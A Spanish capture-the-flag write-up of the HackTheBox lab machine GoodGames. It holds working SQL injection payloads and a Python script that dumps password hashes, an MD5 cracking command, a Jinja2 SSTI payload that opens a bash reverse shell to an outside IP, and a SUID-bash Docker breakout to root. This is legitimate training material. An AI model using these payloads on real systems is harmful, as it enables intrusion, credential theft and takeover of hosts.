---
title: GoodGames | Linux
published: 2025-03-02
image: "./logo.png"
tags: [Easy, Linux, SQLi, Hash Cracking, Password Reuse, SSTI, Docker Breakout, eJPT, eWPT, eCPPTv3, OSCP]
category: HackTheBox
---

## Información Básica

### Técnicas vistas

- SQLI (Error Based)
- Hash Cracking Weak Algorithms
- Password Reuse
- Server Side Template Injection (SSTI)
- Docker Breakout (Privilege Escalation) [PIVOTING]

### Preparación

- eJPT  
- eWPT  
- eCPPTv3  
- OSCP (Escalada)

***

## Reconocimiento

Empezaremos con un reconocimiento a los puertos abiertos de las máquinas, para ver que servicios y versiones corren.

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FDvqjC7BXE47dIDCZPTYs%2F1.png?alt=media&#x26;token=8ce921c6-8e87-4708-b027-e060e70eb495" alt=""><figcaption></figcaption></figure>

Vemos que solo hay un puerto abierto, el **HTTP**, y que tiene por detrás **python3**, vamos a hacer un **whatweb** para ver que más encontramos.

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2Fk3k2Jb5QVxSPx0W9hcqS%2F2.png?alt=media&#x26;token=9c4b5b85-eded-4811-8d2a-c2e14b1a8536" alt=""><figcaption></figcaption></figure>

Confirmamos lo mismo, vamos a ver que hay en la web.

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FfNS1G2BTaTkYJDr3LeKF%2F3.png?alt=media&#x26;token=cbdc0b40-34ae-4b0f-ad29-c8d4daa41188" alt=""><figcaption></figcaption></figure>

Parece una web de juegos, vamos a añadir su dominio al /etc/hosts, y seguir investigando a ver si hay algo interesante. Vemos que hay panel de Login y de Registro, vamos a crear una cuenta.

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FTCPfIev5xSpqRHfSvtAn%2F4.png?alt=media&#x26;token=e20fa464-d398-47a3-a8f6-055e0cab5539" alt=""><figcaption></figcaption></figure>

## Explotación



Vemos un formulario para poder poner nuestro email, pero tiene pinta que no funciona, por lo que vamos a seguir investigando por otro lado. Podemos intentar un **SQL Injection** en el panel de Login:

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FUY8c30TxFfgYiaOD1HBY%2F6.png?alt=media&#x26;token=79e4ccb1-ead6-43d6-b772-4c87604fd2a0" alt=""><figcaption></figcaption></figure>

Nos lo impide la **validación del email**, por lo que podemos intentar hacerlo por consola.


```bash
curl -s -X POST "http://goodgames.htb/login" -d "email=' or 1=1-- -&password=' or 1=1-- -" | html2text

[GoodGames]
****** Login Successful ******
***** Welcome adminZelpro *****
Redirecting you to profile page...
Return to Homepage
*** Search ***
[search              ]
*** Sign In ***
Use email and password:
[Unknown INPUT type]
[********************]
Or social account:
Sign In
Forgot your password?
Not a member? Sign up
```


Podemos ver que funciona. Vamos a hacerlo con **burpsuite** para poder verlo en el navegador.

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FQcyKvDsoFzVhptvv7Iqa%2F7.png?alt=media&#x26;token=7a39b24f-8f1c-49f3-aaeb-ea8840a52954" alt=""><figcaption></figcaption></figure>

Vamos a ver que más cosas podemos encontrar.

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FU4TuteDwp1olOEc7ZWK5%2F8.png?alt=media&#x26;token=42d5060f-dc67-40cc-ac3c-f206adc59afb" alt=""><figcaption></figcaption></figure>

También está usando **VHOST** por lo que lo añadiremos al /etc/hosts.

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2Fshr62KO5pHnds9HHCt8h%2F9.png?alt=media&#x26;token=2f99dfec-cb91-4e4e-b80e-cf2d86067380" alt=""><figcaption></figcaption></figure>

En este panel no podemos hacer **SQL Injection**, pero podemos volver al paso anterior y enumerar más información por si podemos encontrar información de otros usuarios o alguna cosa. Vamos a hacer un script en python.

<pre class="language-python" data-overflow="wrap" data-line-numbers><code class="lang-python">#!/usr/bin/python3  
  
import requests  
import sys  
import re   
<strong>  
</strong># in this case are 4 columns  
def make_request(url: str) ->None:  
for x in range(100, 0, -1):  
ress = requests.post(url=url, data={"email": f"' order by {x}-- -", "password": "test"})  
  
if len(ress.text) != 33490:  
print("the number of columns inside the table ", x)  
return  
  
def make_sqli():  
url = "http://goodgames.htb/login"  
  
sqli_data = [  
"' union select 1,2,3,@@version-- -", # database version  
"' union select 1,2,3,schema_name from information_schema.schemata-- -", # the databases  
"' union select 1,2,3,table_name from information_schema.tables where table_schema='main'-- -", # the tabales  
"' union select 1,2,3,column_name from information_schema.columns where table_name='user'-- -", # the columns  
"' union select 1,2,3,group_concat(id,0x3a,name,0x3a,password,0x3a,email) from user-- -"] # the whole content in that table  
  
for x in sqli_data:  
data = {"email": x, "password": "test"}  
  
response = requests.post(url=url, data=data)  
  
data = response.text  
  
value = re.findall(r'\>Welcome (.*)\&#x3C;', data)  
print(value[0])  
  
def main():  
try:  
make_sqli()  
except Exception as e:  
print(str(e))  
sys.exit(1)  

except KeyboardInterrupt:  
sys.exit(0)  
  
if __name__ == "__main__":  
main()
</code></pre>

Y vemos que ejecutándolo muestra:

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2Fd2tpo2rsBGtb7WPqQxI5%2F10.png?alt=media&#x26;token=352be86e-5338-4f16-bb5b-00aaf5b97099" alt=""><figcaption></figcaption></figure>

Vamos a intentar crackear ese **hash** con **john the ripper**:

```
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FWA1wZDPrVqnWF9X6NH0S%2F11.png?alt=media&#x26;token=c156262b-bbcb-4048-9cad-9aa3a70cd1a4" alt=""><figcaption></figcaption></figure>

Y nos da como resultado superadministrador.

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FBTj5cEfEwBFUsMGFeX0S%2F12.png?alt=media&#x26;token=3990f33a-8329-4d93-8abb-f878ec70aea7" alt=""><figcaption></figcaption></figure>

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FCqYcCLCF9IyA5yNR0dKv%2F13.png?alt=media&#x26;token=5981fe98-221c-4fba-916d-af42b8a76d3a" alt=""><figcaption></figcaption></figure>

Hay un panel de ajustes en el que podemos modificar apartados de nuestro perfil y luego que se vean reflejados. Esto puede dar lugar a un **SSTI** (_Server Side Template Injection_), vamos a comprobarlo:

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2F5ISQJgaE3JM7Kxm2AUrL%2F14.png?alt=media&#x26;token=ddc4a0bd-1a59-44fc-8ff1-5d44d550fcb0" alt=""><figcaption></figcaption></figure>

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FHselNjYswgAmKz4dTgib%2F15.png?alt=media&#x26;token=db8957e0-3452-4b69-926f-995fba8e9a42" alt=""><figcaption></figcaption></figure>

Efectivamente, podemos ver que es vulnerable. Esto puede dar lugar a una reverse shell, vamos a intentarlo con este payload:

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash">{{ 
<strong>self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() 
</strong>}}
</code></pre>

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2F2EyHn63pcD6nuAAlBPcM%2F16.png?alt=media&#x26;token=96f11879-0701-4ebf-8e2b-dfa813f5d9cb" alt=""><figcaption></figcaption></figure>

Podemos ver que funciona, vamos a hacer lo mismo pero para la reverse shell:


```bash
{{ 
self._TemplateReference__context.cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.14.16/443 0>&1"').read() 
}}
```


<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2Ff2qcACepuYnHh37qvpj5%2F17.png?alt=media&#x26;token=1e7a6c36-7833-4b8c-8aae-6b7dfcdb3c6c" alt=""><figcaption></figcaption></figure>

Primero de todo vamos a hacernos la terminal interactiva con los siguientes comandos:


```bash
script /dev/null -c bash
ctrl + z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```


Además de obtener la shell, parece que somos usuario root, vamos a investigar un poco. Hay un usuario llamado augustus y en su escritorio vemos la user flag:

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FVVMJPTmjPQ6xVbsM9EtB%2F18.png?alt=media&#x26;token=e8ce106c-c673-41d2-ba4b-e77383d1d61b" alt=""><figcaption></figcaption></figure>

## Escalada de privilegios

El problema es que en el directorio **root** no hay nada, parece que la root flag puede que esté escondida o que no esté aquí, vamos a investigar más.

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FIaSBENrEvlhgANOJdsMz%2F19.png?alt=media&#x26;token=a9d0d15a-9a21-497d-b1ae-8853dae93df8" alt=""><figcaption></figcaption></figure>

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FFJksouqJDOrMftAoQZo1%2F21.png?alt=media&#x26;token=19661057-2165-4800-af71-4bd640b74540" alt=""><figcaption></figcaption></figure>

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2Fmnd8s5AEro5oY47Hv6oF%2F22.png?alt=media&#x26;token=547a4510-2215-4ada-ac8a-a03f10432110" alt=""><figcaption></figcaption></figure>

Vemos que tiene la IP **172.19.0.2**, por lo que la máquina real podría ser **172.19.0.1** ya que vemos que tiene **Docker** y normalmente la máquina real que genera el docker es esa, vamos a ver que puertos abiertos tiene con el siguiente comando:

```bash
for x in {1..1024}; do (echo >/dev/tcp/172.19.0.1/$x) &>/dev/null && echo "port $x open"; done
```

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FMUoJ99Hbt7fpuQYw2gjz%2F20.png?alt=media&#x26;token=8ea7785e-c90f-494f-867a-9ab3bf927b59" alt=""><figcaption></figcaption></figure>

Vamos a intentar conectarnos por SSH a esta máquina con la contraseña de antes (superadministrator):

```bash
ssh augustus@172.19.0.1
```

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FWhnTSezidmzCAaKK9R6J%2F23.png?alt=media&#x26;token=450fc65a-c895-4de3-8678-8451ec7f7c34" alt=""><figcaption></figcaption></figure>

Perfecto, ahora tocaría la escalada de privilegios. En este caso es un poco curiosa como se hace, porque tenemos un **Docker** con permisos **root** para la carpeta del usuario que corre el docker. Entonces si cogemos la shell del usuario augustus y desde el docker le cambiamos los permisos a root, y luego volvemos al usuario augustus, tendremos una **shell** con **root**:

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FDl2HW9ZfZyrdGGSbwCzT%2F24.png?alt=media&#x26;token=19cf0961-93cb-4ba6-8a8b-c8413bf9c70e" alt=""><figcaption></figcaption></figure>

Primero nos copiamos la bash al directorio de augustus y nos salimos de la conexión SSH.

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FoRh808n9ENjxHLdSq9no%2F25.png?alt=media&#x26;token=a22aa0de-f736-4079-861a-cbfc378d85c9" alt=""><figcaption></figcaption></figure>

Ahora desde el docker vemos que tiene los permisos de el usuario **augustus** (1000), asi que con el comando **chown**, la vamos a hacer nuestra (**root**):

```sh
chown root:root bash
```

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FkGoi7T19Rw33xffEr7Ep%2F26.png?alt=media&#x26;token=2340895c-c78f-4205-82ef-0d74b7b9f2db" alt=""><figcaption></figcaption></figure>

Ahora si hacemos el mismo comando para ver los permisos vemos que nos pertenece:

```sh
chmod 7444 bash
```

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2F1ZmJjA2HOBqNCM9odLTP%2F27.png?alt=media&#x26;token=aebb103c-1376-4546-90be-a93fcaa7e6e9" alt=""><figcaption></figcaption></figure>

Como nos indica esa _**s**_ que ha aparecido, ahora tiene activado el **SUID** por lo que agusutus ya podría ejecutarlo aunque no fuese suyo.

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FqPAYUX99jMas9rrCyXOB%2F28.png?alt=media&#x26;token=36c3dc58-0542-437a-8cc8-69e23299afc2" alt=""><figcaption></figcaption></figure>

Ahora una vez nos conectamos de nuevo nos aparece en rojo, vamos a ejecutarlo.

```bash
./bash -p
```

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2F7hzlHiWTshbSXobsz0bk%2F29.png?alt=media&#x26;token=8c6fb307-5e4d-44a2-951c-f6ea8b5a6ca6" alt=""><figcaption></figcaption></figure>

Ya seríamos root, ahora solo queda ver la flag:

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FV2fCDskeJ8UzI3YzTDqL%2F30.png?alt=media&#x26;token=ecd0289c-8cf8-4924-90ed-8d0f10b5e0d5" alt=""><figcaption></figcaption></figure>

[Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/446)

---